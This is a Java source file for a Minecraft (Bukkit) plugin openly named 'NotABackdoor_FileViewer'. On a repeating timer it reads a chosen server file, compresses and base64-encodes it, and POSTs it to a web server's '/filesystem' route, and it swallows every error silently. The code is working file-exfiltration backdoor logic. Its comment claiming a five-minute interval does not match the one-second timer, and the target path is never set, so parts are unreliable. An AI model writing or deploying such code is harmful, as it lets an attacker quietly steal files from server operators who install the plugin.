package com.lian.notabackdoorfileviewer;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.logging.Level;
import java.util.zip.GZIPOutputStream;

public final class NotABackdoor_FileViewer extends JavaPlugin {

    private String webServerUrl = "http://localhost:3000";
    public String fileToSend;

    @Override
    public void onEnable() {
        // Schedule a task to run every 5 minutes
        new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // Create the URL for the web server's update route
                    String updateUrl = webServerUrl + "/filesystem";

                    // Send a POST request to the web server's update route
                    URL url = new URL(updateUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "text/plain");
                    connection.setRequestProperty("server", "Plugin Server");
                    connection.setRequestProperty("type", "File");
                    connection.setRequestProperty("file", fileToSend.replace("\\", "/"));

                    String filePath = fileToSend;

                    String contents = null;

                    //getLogger().log(Level.INFO, filePath);

                    try {
                        String content = new String(Files.readAllBytes(Paths.get(filePath)));
                        contents = content;
                    } catch (IOException e) {
                        getLogger().log(Level.SEVERE, "Failed to read file: " + e.getMessage());
                    }

                    byte[] compressedData = null;
                    try {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
                        gzipOut.write(contents.getBytes(StandardCharsets.UTF_8));
                        gzipOut.finish();
                        compressedData = baos.toByteArray();
                    } catch (IOException e) {
                        //getLogger().severe("Failed to compress data: " + e.getMessage());
                        return;
                    }

                    // Encode the compressed data using base64
                    String encodedData = Base64.getEncoder().encodeToString(compressedData);

                    //getLogger().log(Level.INFO, contents);

                    // Write the request body
                    connection.setDoOutput(true);
                    OutputStream outputStream = connection.getOutputStream();
                    assert contents != null;
                    outputStream.write(encodedData.getBytes());
                    outputStream.flush();
                    outputStream.close();

                    connection.disconnect();


                    // Close the connection
                } catch (Exception ignored) {

                }
            }
        }.runTaskTimerAsynchronously(this, 0, 20);
    }
}

